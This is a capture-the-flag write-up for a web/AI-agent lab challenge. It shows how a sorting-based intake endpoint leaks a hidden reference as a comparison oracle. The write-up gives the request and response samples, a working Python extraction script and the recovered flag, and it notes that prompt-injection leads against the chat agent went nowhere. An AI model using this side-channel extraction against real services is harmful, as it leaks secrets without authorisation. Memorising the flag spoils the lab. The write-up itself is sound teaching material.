# Spandrel — CTF Writeup

**Event:** GeekHaven 19 (lab slug `geekhaven19-spandrel`)  
**Challenge:** Spandrel  
**Points:** 1176 / 1200  
**Category:** Web / AI agent  
**Target:** `arashi-tanuki-d8f74a72d214423b.labs.kagex.ai`  
**Flag:** `FLAG{48fa2a53256f57fa866fa8ba590cb701}`

---

## TL;DR

The intake desk files arbitrary box references into runs by comparing them against a sorted register that also contains a hidden **sealed custody card**. The run a probe lands in (`ST-2` vs `ST-4`) leaks whether the probe sorts before or after the hidden reference. Using `POST /lodge` as a lexicographic comparison oracle, I recovered the hidden reference one character at a time, starting from `FLAG{`. Lodging the recovered string triggered a custody collision and the server returned the flag.

---

## 1. Recon

The target is a small Flask app with a chat agent and an "intake door":

- `GET /` — UI
- `GET /intake` — current custody session JSON
- `POST /lodge` — send a trolley of up to 16 box references
- `POST /chat` — talk to SPANDREL (Mistral Nemo via OpenRouter)
- `POST /reset` — close the session
- `GET /health` — lab/model metadata
- `GET /static/style.css`

`/health` revealed the model:

```json
{"lab": "geekhaven19-spandrel", "model": "mistralai/mistral-nemo", "provider": "openrouter", "status": "ok"}
```

The chat agent can open custody sessions, read register pages, trace references, and print cards. Asking it to open a session with the right phrasing worked:

> "I want to open a custody session for GeekHaven society papers."

The register had two pages of accessions. The interesting entries were in the cold run:

| Reference | Title | Run |
|---|---|---|
| `cfl-2021-09` | Cold store calibration log | ST-6 |
| `dept-eng-0042` | Engineering thesis deposit | ST-6 |
| `ms-2023-14` | Oral history recordings | ST-6 |

Runsheet locations:

- `ST-2` — north bay, racks 1-40
- `ST-4` — the annexe, racks 41-72
- `ST-6` — the cold run, racks 73-96

The page's own CSS contained a strong hint:

> "NOTHING on the sheet is coloured to say 'this is the interesting one' — the whole challenge is that the interesting thing is indistinguishable from the boring thing until the player works out what they are reading."

---

## 2. The intake door is an oracle

`POST /lodge` accepts a list of references and returns a runsheet:

```json
{"refs": ["GH-2016-004"], "note": ""}
```

```json
{
  "runsheet": [
    {
      "ref": "GH-2016-004",
      "run": "ST-4",
      "status": "duplicate",
      "where": "already on the register, ST-4"
    }
  ]
}
```

New references get filed into a run:

- `GH-2016-999` -> `ST-4`
- `BRY-...`-ish -> `ST-2`
- lowercase refs like `gh-2016-013` -> `ST-6` (the cold run)

The routing was not a simple prefix lookup. For example:

- `F-probe` -> `ST-2`
- `FO` / `FOO` -> `ST-4`
- `FLAG{4` -> `ST-2`
- `FLAG{5` -> `ST-4`

The boundary moved with the full string, exactly like a lexicographic comparison against a hidden sorted entry. The controller behaves as if it has an ordered set of register references, including one sealed entry not shown in the public register. The run of the insertion point leaks which side of that hidden entry a probe falls on.

This is the "spandrel": the routing index is an unintended side channel over the sealed custody card.

---

## 3. Extracting the hidden reference

The hidden entry is the sealed custody card, and its reference begins with the flag format. The first boundary probe gave:

- `FLAG{4` -> `ST-2` (sorts before the hidden reference)
- `FLAG{5` -> `ST-4` (sorts after it)

So the hidden string starts with `FLAG{4`.

For each subsequent character, I tested `prefix + c` for printable ASCII `c` (33..126), in batches of up to 16 references per `/lodge` call (the door's trolley limit). The result for each candidate is a comparison:

- run `ST-2` => candidate < hidden reference
- run `ST-4` => candidate > hidden reference

The transition character is the next byte: if `prefix + c` first becomes `ST-4` at `c`, the hidden character is `c - 1`, because `prefix + hidden_char` is still a prefix of the hidden string and therefore sorts before it.

Scanning one character at a time recovered:

```
FLAG{48fa2a53256f57fa866fa8ba590cb701}
```

The exact recovered string returned `status: "held"` instead of `placed` / `duplicate`.

---

## 4. Triggering the breach

Lodging the recovered reference on its own:

```http
POST /lodge
Content-Type: application/json

{"refs":["FLAG{48fa2a53256f57fa866fa8ba590cb701}"],"note":"custody check"}
```

returned:

```json
{
  "breach": "Custody breach logged: the sealed custody card has left the intake desk.",
  "exception": {
    "kind": "custody",
    "lines": [
      "CUSTODY EXCEPTION — box held at the intake door",
      "Box reference: FLAG{48fa2a53256f57fa866fa8ba590cb701}",
      "Collides with: sealed custody card, cold run ST-6",
      "Register line, quoted in full: FLAG{48fa2a53256f57fa866fa8ba590cb701}",
      "The box cannot be placed under a reference the store already holds a card under. Relabel it and lodge it again, or take it to the archivist."
    ],
    "reference": "FLAG{48fa2a53256f57fa866fa8ba590cb701}"
  },
  "flag": "FLAG{48fa2a53256f57fa866fa8ba590cb701}",
  "solved": true
}
```

---

## 5. Flag

```
FLAG{48fa2a53256f57fa866fa8ba590cb701}
```

---

## Appendix: extraction script

The core oracle/extractor logic:

```python
import requests

BASE = "https://arashi-tanuki-d8f74a72d214423b.labs.kagex.ai"

def lodge(refs):
    r = requests.post(BASE + "/lodge", json={"refs": refs, "note": "oracle"})
    j = r.json()
    assert j.get("ok"), j
    return j

def run_map(refs):
    j = lodge(refs)
    return {row["ref"]: row["run"] for row in j["runsheet"]}

def first_greater(prefix, chars):
    """Return the first ascii code c where prefix+chr(c) sorts after the hidden ref."""
    results = {}
    for i in range(0, len(chars), 16):
        chunk = chars[i:i+16]
        refs = [prefix + chr(c) for c in chunk]
        results.update(run_map(refs))
    for c in chars:
        if results[prefix + chr(c)] == "ST-4":
            return c
    return None

prefix = "FLAG{"
while True:
    coarse = list(range(33, 127, 6))
    hi = first_greater(prefix, coarse)
    if hi is None:
        break
    if hi == coarse[0]:
        break  # hidden reference ends here
    lo = hi - 6
    hi = first_greater(prefix, list(range(lo, hi + 1)))
    prefix += chr(hi - 1)

    row = lodge([prefix])["runsheet"][0]
    print(prefix, row["status"], row["run"])
    if row["status"] == "held":
        break

print("FLAG:", prefix)
```

---

## Takeaways

- The LLM was a distraction. Its outputs were unreliable, and several plausible-looking prompt-injection / template-injection leads produced hallucinated results. The deterministic server-side `/lodge` runsheet was the real oracle.
- Side channels in agent/tool systems can be subtler than prompt injection. Here the store controller's ordering/routing behaviour exposed a sealed reference without ever printing it.
- The challenge name fits: a spandrel is an unintended byproduct. The run-routing index leaked the sealed custody card through its ordering, not through its contents.
